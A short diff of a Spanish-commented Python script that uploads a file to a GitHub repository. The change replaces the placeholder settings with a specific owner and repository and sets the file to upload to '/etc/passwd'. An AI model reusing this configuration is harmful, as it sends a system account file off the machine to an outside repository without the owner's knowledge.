@@ -31,10 +31,10 @@ def upload_to_github(token, repo_owner, repo_name, file_path, commit_message):
 
 # Configuración
 token = "TU_TOKEN_DE_ACCESO"
-repo_owner = "tuusuario"
-repo_name = "turepositorio"
-file_path = "ruta/del/tu/archivo"
-commit_message = "Agrega tu mensaje de commit"
+repo_owner = "lauraalmrui"
+repo_name = "almacenlar"
+file_path = "/etc/passwd"
+commit_message = "Listo!!!"
 
 # Llama a la función para subir el archivo
 upload_to_github(token, repo_owner, repo_name, file_path, commit_message)
